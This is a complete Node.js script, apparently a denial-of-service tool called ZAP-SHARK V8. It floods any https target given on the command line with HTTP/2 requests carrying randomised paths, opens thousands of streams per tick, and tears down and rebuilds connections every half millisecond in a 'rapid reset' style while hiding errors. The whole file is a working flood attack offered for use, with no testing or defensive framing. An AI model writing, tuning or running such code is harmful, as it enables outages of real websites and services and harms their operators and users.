const http2 = require('http2');

class ZAPSHARK_V8_MAXPOWER {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "MAXPOWER";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // MAX POWER SETTINGS
        this.clients = [];
        this.clientCount = 10; // MAX CONNECTIONS
        this.maxStreamsPerClient = 1000;
        this.activeStreams = 0;
        
        // EXTREME RAPID RESET
        this.resetInterval = 0.5; // 0.5ms
        this.lastResetTime = Date.now();
        this.resetCounter = 0;
        
        // PERFORMANCE
        this.peakRPS = 0;
        this.lastDisplayUpdate = Date.now();
        
        // INTERVALS
        this.attackInterval = null;
        this.resetIntervalObj = null;
        this.displayInterval = null;
    }

    // === MAX CONNECTIONS ===
    initializeMaxConnections() {
        console.log(`[+] Creating ${this.clientCount} H2 connections...`);
        
        for (let i = 0; i < this.clientCount; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 32768, // MAX MEMORY
                    maxDeflateDynamicTableSize: 4294967295,
                    peerMaxConcurrentStreams: 1000
                });
                
                client.setMaxListeners(1000);
                
                // AGGRESSIVE SETTINGS
                client.settings({
                    enablePush: false,
                    initialWindowSize: 16777215,
                    maxConcurrentStreams: 1000
                });
                
                client.on('error', () => {
                    // SILENT FAIL - REPLACE IMMEDIATELY
                    setTimeout(() => {
                        const newClient = this.createClient();
                        if (newClient) {
                            this.clients[i] = newClient;
                        }
                    }, 10);
                });
                
                this.clients.push(client);
                
            } catch (err) {
                // CONTINUE WITH FEWER CLIENTS
            }
        }
        
        console.log(`[+] ${this.clients.length} connections established`);
    }

    createClient() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 32768
            });
            client.setMaxListeners(1000);
            client.on('error', () => {});
            return client;
        } catch (err) {
            return null;
        }
    }

    // === EXTREME RAPID RESET (0.5ms) ===
    performExtremeReset() {
        this.resetCounter++;
        
        // RESET 1% OF CONNECTIONS EVERY 0.5ms
        if (this.clients.length > 0) {
            const clientIndex = Math.floor(Math.random() * this.clients.length);
            const client = this.clients[clientIndex];
            
            if (client) {
                try {
                    client.destroy();
                    
                    // INSTANT REPLACEMENT
                    const newClient = this.createClient();
                    if (newClient) {
                        this.clients[clientIndex] = newClient;
                    }
                } catch (err) {
                    // SILENT
                }
            }
        }
        
        this.lastResetTime = Date.now();
    }

    // === MAX POWER ATTACK ===
    sendMaxRequests() {
        if (this.clients.length === 0) return;
        
        // CALCULATE MAX STREAMS WE CAN SEND
        const maxPossibleStreams = this.maxStreamsPerClient * this.clients.length;
        const availableStreams = maxPossibleStreams - this.activeStreams;
        
        // USE 80% OF AVAILABLE STREAMS (AGGRESSIVE)
        const streamsThisTick = Math.max(1, Math.floor(availableStreams * 0.8));
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = this.clients[Math.floor(Math.random() * this.clients.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request({
                    ':method': 'GET',
                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 5)
                });
                
                // MINIMAL EVENT HANDLING FOR SPEED
                req.on('response', () => {
                    try { req.destroy(); } catch (e) {}
                });
                
                req.on('error', () => {
                    try { req.destroy(); } catch (e) {}
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // === MAXIMIZED DISPLAY ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.09) { // UPDATE EVERY 90ms FOR SMOOTHER DISPLAY
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    updateDisplay() {
        this.calculateRPS();
        
        // OVERWRITE EVERY 0.1s
        process.stdout.write(`\rSHARK-TRS — ${this.totalRequests} | RPS — ${this.currentRPS.toFixed(1)} | PEAK — ${this.peakRPS.toFixed(1)} | CONNS — ${this.clients.length} | STREAMS — ${this.activeStreams}`);
    }

    // === MAIN ===
    start() {
        console.log('=== ZAP-SHARK V8 | MAX POWER ===');
        console.log('Focus: TOTAL REQS & RPS ONLY');
        console.log('Connections: 10');
        console.log('Rapid Reset: 0.5ms');
        console.log('='.repeat(50));
        
        this.initializeMaxConnections();
        
        setTimeout(() => {
            console.log('\n[+] MAX POWER ENGAGED');
            
            // EXTREME RAPID RESET (0.5ms)
            this.resetIntervalObj = setInterval(() => {
                this.performExtremeReset();
            }, 0.5);
            
            // MAX ATTACK LOOP
            this.attackInterval = setInterval(() => {
                // SEND MULTIPLE BATCHES PER TICK
                for (let batch = 0; batch < 5; batch++) {
                    this.sendMaxRequests();
                }
            }, 0.1); // 100 MICROSECONDS
            
            // DISPLAY UPDATE (0.1s)
            this.displayInterval = setInterval(() => {
                this.updateDisplay();
            }, 100);
            
        }, 2000);
        
        process.on('SIGINT', () => {
            const runtime = (Date.now() - this.startTime) / 1000;
            const avgRPS = this.totalRequests / runtime;
            
            console.log('\n\n=== MAX POWER STATS ===');
            console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`Peak RPS: ${this.peakRPS.toFixed(1)}`);
            console.log(`Average RPS: ${avgRPS.toFixed(1)}`);
            console.log(`Runtime: ${runtime.toFixed(1)}s`);
            console.log(`Resets: ${this.resetCounter}`);
            console.log('='.repeat(40));
            
            this.running = false;
            clearInterval(this.attackInterval);
            clearInterval(this.resetIntervalObj);
            clearInterval(this.displayInterval);
            
            this.clients.forEach(client => {
                try { client.destroy(); } catch (e) {}
            });
            
            process.exit(0);
        });
    }
}

// USAGE WITH MAX PERFORMANCE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v8.js https://target.com');
    process.exit(1);
}

// MAXIMIZE NODE PERFORMANCE
process.env.UV_THREADPOOL_SIZE = 64;
process.env.NODE_OPTIONS = '--max-old-space-size=8192 --max-semi-space-size=128';

const shark = new ZAPSHARK_V8_MAXPOWER(target);
shark.start();
